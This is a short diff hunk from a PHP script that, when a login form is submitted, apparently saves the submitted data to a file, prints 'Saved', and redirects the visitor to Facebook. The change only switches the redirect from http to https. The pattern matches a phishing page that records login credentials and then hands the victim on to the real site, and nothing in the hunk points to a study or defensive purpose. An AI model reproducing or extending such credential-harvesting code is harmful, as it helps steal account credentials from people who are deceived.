@@ -10,6 +10,6 @@ if(isset($_POST['login-btn']))
         echo 'Saved';
     }
 fclose ($fp);
-header("Location: http://www.facebook.com");
+header("Location: https://www.facebook.com");
 die();
 }?>
